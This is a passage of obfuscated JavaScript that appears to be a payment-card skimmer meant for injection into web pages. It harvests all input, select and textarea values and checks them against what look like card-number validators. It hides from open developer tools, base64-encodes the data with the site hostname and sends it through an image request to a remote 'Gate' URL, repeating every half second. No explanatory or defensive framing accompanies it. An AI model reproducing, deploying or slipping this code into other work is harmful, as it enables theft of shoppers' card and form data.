_0x555d43={};_0x555d43[_0x1aff('0x11')]=_0x1aff('0x12');_0x555d43[_0x1aff('0x13')]={};_0x555d43[_0x1aff('0x14')]=[];_0x555d43[_0x1aff('0x15')]=![];_0x555d43[_0x1aff('0x16')]=function(_0x3299d8){if(_0x3299d8.id!==undefined&&_0x3299d8.id!=''&&_0x3299d8.id!==null&&_0x3299d8.value.length<0x100&&_0x3299d8.value.length>0x0){if(_0xf7d4aa(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20',''))&&_0x42aee7(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20','')))_0x555d43.IsValid=!![];_0x555d43.Data[_0x3299d8.id]=_0x3299d8.value;return;}if(_0x3299d8.name!==undefined&&_0x3299d8.name!=''&&_0x3299d8.name!==null&&_0x3299d8.value.length<0x100&&_0x3299d8.value.length>0x0){if(_0xf7d4aa(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20',''))&&_0x42aee7(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20','')))_0x555d43.IsValid=!![];_0x555d43.Data[_0x3299d8.name]=_0x3299d8.value;return;}};_0x555d43[_0x1aff('0x17')]=function(){var _0x128849=document.getElementsByTagName(_0x1aff('0x18'));var _0x26cafa=document.getElementsByTagName(_0x1aff('0x19'));var _0x2b0e3b=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x377079=0x0;_0x377079<_0x128849.length;_0x377079++)_0x555d43.SaveParam(_0x128849[_0x377079]);for(var _0x377079=0x0;_0x377079<_0x26cafa.length;_0x377079++)_0x555d43.SaveParam(_0x26cafa[_0x377079]);for(var _0x377079=0x0;_0x377079<_0x2b0e3b.length;_0x377079++)_0x555d43.SaveParam(_0x2b0e3b[_0x377079]);};_0x555d43['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x555d43.IsValid){_0x555d43.Data[_0x1aff('0x1a')]=location.hostname;var _0x244f13=encodeURIComponent(window.btoa(JSON.stringify(_0x555d43.Data)));var _0x3065a7=_0x244f13.hashCode();for(var _0x46ccea=0x0;_0x46ccea<_0x555d43.Sent.length;_0x46ccea++)if(_0x555d43.Sent[_0x46ccea]==_0x3065a7)return;_0x555d43.LoadImage(_0x244f13);}};_0x555d43['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x555d43.SaveAllFields();_0x555d43.SendData();};_0x555d43[_0x1aff('0x1b')]=function(_0x25c8f9){_0x555d43.Sent.push(_0x25c8f9.hashCode());var _0x3164a6=document.createElement(_0x1aff('0x1c'));_0x3164a6.src=_0x555d43.GetImageUrl(_0x25c8f9);};_0x555d43[_0x1aff('0x1d')]=function(_0xbdbae8){return _0x555d43.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0xbdbae8;};document[_0x1aff('0x1e')]=function(){if(document[_0x1aff('0x1f')]===_0x1aff('0x20')){window[_0x1aff('0x21')](_0x555d43[_0x1aff('0x22')],0x1f4);}};